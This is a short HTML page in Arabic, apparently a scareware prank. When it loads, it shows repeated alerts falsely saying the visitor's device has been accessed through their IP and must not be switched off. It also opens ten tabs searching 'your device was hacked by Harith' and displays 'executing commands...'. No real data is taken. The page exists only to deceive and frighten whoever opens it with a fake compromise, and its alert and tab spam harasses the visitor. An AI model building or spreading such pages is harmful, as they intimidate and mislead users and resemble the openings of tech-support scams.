<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>تم الوصول إلى جهازك</title>
  <script>
    let count = 0;

    function spamAlerts() {
      alert("⚠️ تم الوصول إلى جهازك عبر الـ IP. يرجى عدم إطفاء الجهاز.");
      count++;
      if (count < 5) {
        setTimeout(spamAlerts, 1000);
      }
    }

    function spamTabs() {
      for (let i = 0; i < 10; i++) {
        window.open("https://www.google.com/search?q=تم+اختراق+جهازك+من+قبل+Harith", "_blank");
      }
    }

    window.onload = function() {
      spamAlerts();
      spamTabs();
    };
  </script>
</head>
<body>
  <h1 style="text-align:center; margin-top:20%;">جاري تنفيذ الأوامر...</h1>
</body>
</html>
